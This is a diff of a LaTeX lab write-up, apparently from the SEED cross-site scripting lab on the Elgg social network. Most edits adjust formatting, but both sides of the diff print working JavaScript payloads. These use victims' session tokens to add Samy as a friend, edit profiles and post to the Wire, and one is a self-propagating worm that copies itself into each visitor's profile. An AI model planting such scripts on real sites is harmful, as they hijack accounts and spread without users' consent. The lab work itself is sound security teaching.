@@ -107,7 +107,6 @@ We then place the following in Samy's ``About Me'' in ``Edit HTML'' format:
 	}
 </script>
 \end{minted}
-\newpage
 After this, when Alice visits Samy's profile, the attack is executed with the following request being sent:
      \begin{figure}[H]
          \centering
@@ -115,10 +114,10 @@ After this, when Alice visits Samy's profile, the attack is executed with the fo
          \caption{GET Request sent as a result of the attack}
          \label{fig:ss7}
      \end{figure}
-On reload, we can see that, Samy is now alice's friend.
+On reload, we can see that, Samy is now Alice's friend.
      \begin{figure}[H]
          \centering
-         \includegraphics[width=\textwidth]{Images/ss1.png}
+         \includegraphics[width=0.7\textwidth]{Images/ss1.png}
          \caption{Samy gets added as Alice's friend}
          \label{fig:ss1}
      \end{figure}
@@ -165,25 +164,24 @@ So, basically content is the concatenated form of all the attributes. We can use
 
 \begin{minted}[tabsize=4,breaklines=true,breakanywhere=true,bgcolor=LightGray]{html}
 <script type="text/javascript">
-	window.onload = function() {
-	    var ts=elgg.security.token.__elgg_ts;
-	    var token=elgg.security.token.__elgg_token;
-	    var userName=elgg.session.user.name;
-	    var guid=elgg.session.user.guid;
-        var sendurl='/action/profile/edit';
-	    var content=`__elgg_token=${token}&__elgg_ts=${ts}&name=${userName}&description=1905001&accesslevel[description]=1&briefdescription=I am Samy, the worm. Catch me if you can.&accesslevel[briefdescription]=1&location=Moscow&accesslevel[location]=1&interests=Hacking&accesslevel[interests]=1&skills=Cyber Security&accesslevel[skills]=1&contactemail=abc@yahoo.com&accesslevel[contactemail]=1&phone=9786546&accesslevel[phone]=1&mobile=01234567898&accesslevel[mobile]=1&website=www.clickme.com&accesslevel[website]=1&twitter=elonmusk&accesslevel[twitter]=1&guid=${guid}`;
+    window.onload = function () {
+        var ts = elgg.security.token.__elgg_ts;
+        var token = elgg.security.token.__elgg_token;
+        var userName = elgg.session.user.username;
+        var guid = elgg.session.user.guid;
+        var sendurl = '/action/profile/edit';
+        var content = `__elgg_token=${token}&__elgg_ts=${ts}&name=${userName}&description=1905001&accesslevel[description]=1&briefdescription=I am Samy, the worm. Catch me if you can.&accesslevel[briefdescription]=1&location=Moscow&accesslevel[location]=1&interests=Hacking&accesslevel[interests]=1&skills=Cyber Security&accesslevel[skills]=1&contactemail=abc@yahoo.com&accesslevel[contactemail]=1&phone=9786546&accesslevel[phone]=1&mobile=01234567898&accesslevel[mobile]=1&website=www.clickme.com&accesslevel[website]=1&twitter=elonmusk&accesslevel[twitter]=1&guid=${guid}`;
 
-        if(guid != 59)
-        {
-            var Ajax=null;
-            Ajax=new XMLHttpRequest();
-            Ajax.open("POST",sendurl,true);
-            Ajax.setRequestHeader("Host","www.seed-server.com");
+        if (guid != 59) {
+            var Ajax = null;
+            Ajax = new XMLHttpRequest();
+            Ajax.open("POST", sendurl, true);
+            Ajax.setRequestHeader("Host", "www.seed-server.com");
             Ajax.setRequestHeader("Content-Type",
-            "application/x-www-form-urlencoded");
+                "application/x-www-form-urlencoded");
             Ajax.send(content);
         }
-	}
+    }
 </script>
 \end{minted}
 
@@ -192,10 +190,10 @@ But there is a more elegant solution, through Form Data. We end up using that.
 
 \begin{minted}[breakanywhere=true,bgcolor=LightGray,breaklines=true,tabsize=4]{html}
 <script type="text/javascript">
-    window.onload = function() {
+    window.onload = function () {
         var ts = elgg.security.token.__elgg_ts;
         var token = elgg.security.token.__elgg_token;
-        var userName = elgg.session.user.name;
+        var userName = elgg.session.user.username;
         var guid = elgg.session.user.guid;
 
         var sendurl = "/action/profile/edit";
@@ -284,7 +282,7 @@ __elgg_token=un1KjOAjar7PKPaDSDuDfA&__elgg_ts=1707419569&body=Test Post
 
     \begin{figure}[H]
          \centering
-         \includegraphics[width=\textwidth]{Images/ss4.png}
+         \includegraphics[width=0.95\textwidth]{Images/ss4.png}
          \caption{POST Request for posing on the Wire}
          \label{fig:ss4}
      \end{figure}
@@ -293,10 +291,10 @@ This task is quite similar to the previous one, in fact the request body is way 
 
 \begin{minted}[tabsize=4,breaklines=true,breakanywhere=true,bgcolor=LightGray]{html}
 <script type="text/javascript">
-    window.onload = function() {
+    window.onload = function () {
         var ts = elgg.security.token.__elgg_ts;
         var token = elgg.security.token.__elgg_token;
-        var name = elgg.session.user.name;
+        var userName = elgg.session.user.username;
         var guid = elgg.session.user.guid;
 
         var sendurl = "/action/thewire/add";
@@ -320,6 +318,7 @@ This task is quite similar to the previous one, in fact the request body is way 
 </script>
 \end{minted}
 
+\newpage
 When Alice visits Samy's profile this time, a post is made from her profile without her knowing it.
     \begin{figure}[H]
          \centering
@@ -329,7 +328,7 @@ When Alice visits Samy's profile this time, a post is made from her profile with
      \end{figure}
     \begin{figure}[H]
          \centering
-         \includegraphics[width=0.9\textwidth]{Images/ss5.png}
+         \includegraphics[width=\textwidth]{Images/ss5.png}
          \caption{Wire post made from Alice's profile}
          \label{fig:ss5}
      \end{figure}
@@ -360,25 +359,26 @@ The full script is the following:
     window.onload = function () {
         // First part: Send Samy a friend request from the visitor's account
         var ts = elgg.security.token.__elgg_ts; // Time Stamp
-        var token= elgg.security.token.__elgg_token; // Security Token
-        var userName = elgg.session.user.name;
+        var token = elgg.security.token.__elgg_token; // Security Token
+        var userName = elgg.session.user.username;
         var guid = elgg.session.user.guid;
         var SamyID = 59;
         if (guid == SamyID) return; // no attack if Samy is the visitor
         var sendurl = `/action/friends/add?friend=${SamyID}&__elgg_ts=${ts}&__elgg_token=${token}&__elgg_ts=${ts}&__elgg_token=${token}`;
-        // Create and send Ajax request to add friend
+        //Create and send Ajax request to add friend
         var Ajax1 = new XMLHttpRequest();
-        Ajax1.open("GET", sendurl, true);
+        Ajax1.open("GET", sendurl, true); // last boolean value is for asynchronous request making
         Ajax1.setRequestHeader("Host", "www.seed-server.com");
         Ajax1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         Ajax1.send();
 
         // Second part: Modify the visitor's profile
-	    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
-	    var jsCode = document.getElementById("worm").innerHTML;
-	    var tailTag = "</" + "script>";
-	    var wormCode = headerTag + jsCode + tailTag;
+        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+        var jsCode = document.getElementById("worm").innerHTML;
+        var tailTag = "</" + "script>";
+        var wormCode = headerTag + jsCode + tailTag;
         var sendurl = "/action/profile/edit";
+
         var formData = new FormData();
         formData.append('__elgg_token', token);
         formData.append('__elgg_ts', ts);
@@ -409,6 +409,7 @@ The full script is the following:
         Ajax2.setRequestHeader("Host", "www.seed-server.com");
         Ajax2.send(formData);
 
+
         // Third Part: Post the profile link of the visitor on Wire
         var sendurl = "/action/thewire/add";
         var postBody = "To earn 12 USD/Hour(!), visit now\nhttp://www.seed-server.com/profile/" + userName;
@@ -420,7 +421,7 @@ The full script is the following:
         Ajax3.open("POST", sendurl, true);
         Ajax3.setRequestHeader("Host", "www.seed-server.com");
         Ajax3.send(formData);
-	}
+    }
 </script>
 \end{minted}
 
@@ -429,14 +430,14 @@ The conseuquences of this attack are manifold. For example, after Samy added the
  \item When Alice visits Samy's profile, Samy gets a friend request from her without her knowing it:
      \begin{figure}[H]
          \centering
-         \includegraphics[width=0.8\textwidth]{Images/ss10.png}
+         \includegraphics[width=0.5\textwidth]{Images/ss10.png}
          \caption{Samy gets a friend request from Alice without her knowing it}
          \label{fig:ss10}
      \end{figure}
  \item Alice's profile gets modified with the worm in her ``About Me'' field, which will eventually get propagated:
      \begin{figure}[H]
          \centering
-         \includegraphics[width=0.7\textwidth]{Images/ss11.png}
+         \includegraphics[width=0.8\textwidth]{Images/ss11.png}
          \caption{Alice's profile gets modified along with the worm}
          \label{fig:ss11}
      \end{figure}
